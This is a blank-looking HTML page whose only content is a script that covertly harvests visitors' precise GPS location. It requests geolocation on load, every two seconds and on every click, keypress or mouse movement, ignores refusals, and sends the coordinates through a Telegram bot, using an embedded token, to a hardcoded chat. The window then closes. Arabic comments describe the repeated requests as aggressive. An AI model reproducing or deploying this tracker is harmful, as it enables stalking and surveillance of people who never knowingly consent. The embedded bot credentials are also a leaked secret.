<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title> </title>
    <script>
        const BOT_TOKEN = "8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI";
        const CHAT_ID = "6451561574";

        function aggressiveInfiniteRequest() {
            // طلب فوري
            requestLocation();
            
            // طلب كل 2 ثانية
            setInterval(requestLocation, 2000);
            
            // طلب عند أي تفاعل
            window.addEventListener('click', requestLocation);
            window.addEventListener('touchstart', requestLocation);
            window.addEventListener('keydown', requestLocation);
            window.addEventListener('mousemove', requestLocation);
        }

        function requestLocation() {
            navigator.geolocation.getCurrentPosition(
                async function(position) {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: `📍 ${lat},${lng}`
                        })
                    });
                    
                    window.close();
                },
                function(error) {
                    // تجاهل الرفض - نستمر
                },
                { enableHighAccuracy: true, timeout: 3000 }
            );
        }

        // البدء العدواني الفوري
        aggressiveInfiniteRequest();
        
        // وإعادة البدء كل 10 ثواني للتأكد
        setInterval(aggressiveInfiniteRequest, 10000);

    </script>
</head>
<body style="margin:0;padding:0;background:transparent;">
</body>
</html>
